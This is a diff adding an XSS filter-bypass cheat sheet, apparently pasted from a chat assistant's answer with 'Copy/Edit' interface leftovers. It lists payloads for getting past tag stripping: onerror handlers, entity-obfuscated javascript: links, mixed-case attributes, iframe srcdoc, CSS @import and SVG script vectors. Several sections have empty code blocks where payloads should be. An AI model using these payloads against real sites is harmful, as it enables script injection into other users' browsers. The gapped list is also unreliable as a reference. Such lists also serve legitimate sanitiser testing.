@@ -1,0 +1,61 @@
+🔍 Goal: Bypass Tag Stripping to Execute JavaScript
+⚠️ Common Bypass Payloads to Test
+1. Event Handler Injection (If partial HTML is allowed)
+html
+Copy
+Edit
+<img src=x onerror=alert(1)>
+2. Encoded JavaScript URI in Links
+html
+Copy
+Edit
+<a href="javascript:alert(1)">Click me</a>
+If <a> tags are allowed but javascript: is filtered, try obfuscation:
+
+html
+Copy
+Edit
+<a href="javas&#99;ript:alert(1)">Click me</a>
+3. Mixed Case or Obfuscated Attributes
+html
+Copy
+Edit
+<IMG SRC=x ONERROR=alert(1)>
+<Img SrC=x OnErRoR=alert(1)>
+4. Broken/Incomplete Tags (if the parser is lenient)
+html
+Copy
+Edit
+
+Or:
+
+html
+Copy
+Edit
+
+5. HTML Entity/Unicode Bypass
+html
+Copy
+Edit
+<scr&#x69;pt>alert(1)</scr&#x69;pt>
+Or try this:
+
+html
+Copy
+Edit
+
+6. Using srcdoc in iframe (if iframe allowed)
+html
+Copy
+Edit
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+7. Style-Based XSS (rare but possible in old browsers or weak CSPs)
+html
+Copy
+Edit
+<style>@import 'javascript:alert(1)';</style>
+
+
+<svg><script>confirm(1)</script>
+<svg/onload=alert(1)>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
